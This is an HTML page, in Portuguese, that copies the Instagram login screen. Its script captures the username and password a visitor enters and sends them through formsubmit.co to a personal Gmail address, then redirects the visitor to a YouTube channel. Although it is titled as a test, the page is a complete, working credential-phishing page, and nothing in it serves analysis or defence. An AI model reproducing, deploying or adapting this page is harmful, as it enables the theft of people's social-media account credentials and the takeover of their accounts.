<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Instagram - Teste</title>
  <style>
    body {
      background-color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      color: #262626;
    }

    .logo {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      margin-bottom: 30px;
    }

    form {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 30px;
      border-radius: 1px;
      width: 100%;
      max-width: 320px;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
    }

    input {
      margin-bottom: 8px;
      padding: 12px 10px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      outline: none;
    }

    input:focus {
      border-color: #a8a8a8;
      background: #fff;
    }

    .links {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 12px;
      margin: 8px 0 16px;
    }

    .links a {
      color: #00376b;
      text-decoration: none;
    }

    .links a:hover {
      text-decoration: underline;
    }

    button {
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      padding: 12px 0;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 5px;
    }

    button:hover {
      background-color: #2a78d4;
    }

    .footer {
      margin-top: 20px;
      font-size: 13px;
    }

    .footer a {
      color: #00376b;
      text-decoration: none;
      font-weight: bold;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="logo">Instagram</div>

  <form id="loginForm">
    <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required />
    <input type="password" name="password" placeholder="Senha" required />

    <div class="links">
      <div></div>
      <a href="#">Esqueceu a senha?</a>
    </div>

    <button type="submit">Entrar</button>
  </form>

  <div class="footer">
    Não tem uma conta? <a href="#">Cadastre-se</a>
  </div>

  <script>
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function(event) {
      event.preventDefault();

      const formData = new FormData(form);

      fetch('https://formsubmit.co/ajax/fabiofrancisco655@gmail.com', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      })
      .then(response => {
        if (response.ok) {
          window.location.href = 'https://www.youtube.com/@NATTO_BEATS';
        } else {
          alert('Erro ao enviar o formulário.');
        }
      })
      .catch(() => {
        alert('Erro na conexão.');
      });
    });
  </script>
</body>
</html>
